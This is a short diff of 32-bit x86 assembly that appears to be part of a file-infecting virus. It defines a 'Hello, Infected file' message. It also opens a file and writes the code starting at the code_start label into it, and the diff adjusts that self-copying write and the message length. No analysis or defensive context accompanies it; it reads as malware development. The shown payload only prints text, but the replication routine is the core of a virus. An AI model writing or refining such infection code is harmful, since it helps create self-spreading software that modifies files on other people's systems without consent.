@@ -1,5 +1,5 @@
 section .data
-hello_infected: db "Hello, Infected file!",10,0
+hello_infected: db "Hello, Infected file",10,0
 
 section .text
 global _start
@@ -56,7 +56,7 @@ code_start:
         mov eax,4 ;sys_write
         mov ebx, 1 ;stdout
         mov ecx, hello_infected ; insert location in memory
-        mov edx, 23 ; length of the string
+        mov edx, 22 ; length of the string
         int 0x80
         popfd
         popad
@@ -76,8 +76,8 @@ code_start:
         mov [ebp -4], eax ; save file descriptor
         mov eax,4 ;sys_write
         mov ebx, [ebp-4] ; file descriptor
-        mov ecx, 0x40
-        mov edx, 98
+        mov ecx, code_start
+        mov edx, 99
         int 0x80
         mov eax, 6
         mov ebx, [ebp-4]
